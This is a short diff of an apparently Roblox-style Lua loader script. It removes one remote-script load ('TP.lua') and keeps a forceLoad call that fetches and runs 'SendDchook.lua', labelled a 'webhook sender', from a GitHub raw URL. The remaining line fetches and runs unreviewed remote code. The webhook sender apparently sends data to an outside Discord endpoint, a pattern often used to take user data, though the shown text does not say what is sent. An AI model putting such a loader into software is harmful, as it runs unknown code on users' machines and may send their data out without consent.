@@ -14,8 +14,6 @@ local function forceLoad(url)
     end
 end
 
--- Step 0: Run TP.lua first (before everything else)
-forceLoad("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/TP.lua")
 
 -- Step 1: Run webhook sender
 forceLoad("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/SendDchook.lua")
